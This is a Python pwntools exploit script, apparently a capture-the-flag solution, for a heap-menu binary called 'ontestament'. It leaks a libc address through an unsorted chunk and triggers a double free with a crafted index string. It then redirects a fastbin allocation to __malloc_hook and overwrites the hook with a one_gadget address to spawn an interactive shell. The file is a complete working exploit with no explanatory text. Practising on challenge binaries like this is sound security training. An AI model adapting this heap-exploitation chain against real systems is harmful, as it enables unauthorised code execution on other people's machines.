from pwn import *
filename="./ontestament"
libc_name="./libc.so.6"
io = process(filename)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']



"""
type = 1:0x18
type = 2:0x30
type = 3:0x60
type = 4:0x7c
"""
og = [0x45226,0x4527a,0xf03a4,0xf1247]

def new(mytype,content,n=False):
    io.recvuntil('Please enter your choice:')
    io.sendline(str(1))
    io.recvuntil('choice:')
    io.sendline(str(mytype))
    io.recvuntil('testatment content:')
    if(n):
        io.send(content)
    else:
        io.sendline(content)


def edit(index,content):
    io.recvuntil('Please enter your choice:')
    io.sendline(str(3))
    io.recvuntil('index:')
    io.sendline(str(index))
    io.recvuntil('content:')
    io.send(str(content))

def show():
    io.recvuntil('Please enter your choice:')
    io.sendline(str(2))

def delete(index):
    io.recvuntil('choice')
    io.sendline(str(4))
    io.recvuntil('index:')
    io.sendline(str(index))


def debug():
    cmd = ""
    cmd +="brva 0x1105\n"
    # cmd+="brva 0xEF9\n"
    gdb.attach(io,cmd)
    show()

# use edit to increase mmap posoition of unsorted chunk
new(1,p64(0xcafecafe)) #idx0
new(4,p64(0xdeadbeef)) #idx1
new(3,p64(0xbabebabe)) #idx2
delete(1)
edit(0,0x18) # set mmap with 1
edit(0,0x18)
new(4,"\n",n=True) # cause leak, idx3
# debug()
libc_info = u64(io.recvuntil('\x7f')[-6:].ljust(8,b"\x00"))
success("libc_info: " + hex(libc_info))
libc_base = libc_info - 0x3c4b0a
success("libc_base: " + hex(libc_base))

# double free

new(3,p64(0)) # idx4, vuln one
delete(4)# into fastbin
# debug()
# malicious delete 2
io.recvuntil('choice')
io.sendline(str(4))
# debug()
io.recvuntil('index:')
payload ="00002"
io.send(payload) #overlap

delete(4)
new(3,p64(libc_base+libc.symbols['__malloc_hook']-0x23))
new(3,"\n",n=True)
new(3,"\n",n=True)
# debug()
new(3,b"a"*0x13+p64(og[1]+libc_base))
# debug()
io.recvuntil('Please enter your choice:')
io.sendline(str(1))
io.recvuntil('choice:')
io.sendline(str(1))



io.interactive()